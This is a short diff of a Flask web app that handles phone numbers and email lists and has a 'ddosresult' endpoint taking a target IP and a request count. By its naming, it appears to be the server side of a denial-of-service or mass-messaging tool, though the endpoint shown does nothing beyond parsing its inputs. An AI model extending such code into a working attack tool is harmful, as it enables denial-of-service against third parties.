@@ -11,8 +11,6 @@ app = Flask(__name__)
 
 sent_emails = []
 sent_numbers = []
-ddosip = ''
-ddoscount = 0
 
 def handlePost(clientNumber, clientEmails):
 	fp_numbers = open('phonenumbers.txt', 'r') # temp, would normally be sent from client
@@ -66,8 +64,9 @@ def result():
 def ddosresult():
 		ip = request.form['ip']
 		count = int(request.form['count'])
-		print (ip,count)
 		return ''
 
 if __name__ == "__main__":
-    app.run()
+		ddosip = 'abc'
+		ddoscount = 0
+		app.run()
